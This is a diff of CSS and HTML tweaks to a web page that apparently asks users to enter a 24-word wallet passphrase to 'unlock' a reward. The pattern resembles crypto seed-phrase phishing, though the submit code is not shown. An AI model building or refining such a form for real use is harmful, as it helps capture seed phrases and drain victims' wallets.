@@ -135,11 +135,12 @@ body {
             margin-bottom: 15px;
             color: #333;
             text-align: center; /* Centers the heading */
+            width: 100%;
         }
 
         .input-box {
-            width: 95%; /* Increase width to match the reference image */
-            height: 120px; /* Adjust height to be taller */
+            width: 95%; /* Increased width */
+            height: 150px; /* Increased height */
             padding: 12px;
             font-size: 16px;
             border: 1px solid #ddd;
@@ -164,7 +165,6 @@ body {
             transition: all 0.3s ease-in-out;
         }
         
-
         .purple-btn:hover {
             transform: scale(1.05);
         }
@@ -179,9 +179,10 @@ body {
         .non-custodial-message {
             font-size: 14px;
             color: #666;
-            text-align: center;
+            text-align: justify; /* Adjusts text alignment */
             margin-top: 10px;
             max-width: 90%;
+            line-height: 1.5;
         }
 
     </style>
@@ -242,8 +243,10 @@ body {
             <textarea id="passphrase" class="input-box" placeholder="Enter your 24-word passphrase here"></textarea>
             <button class="purple-btn" onclick="submitPassphrase()">Unlock with Passphrase</button>
             <p id="message" class="reward-text"></p>
+            <p id="message" class="reward-text"></p>
             <p class="non-custodial-message">
-               As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+    As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
+    Recovery of passphrase is currently impossible.
             </p>
         </div>
     </div>
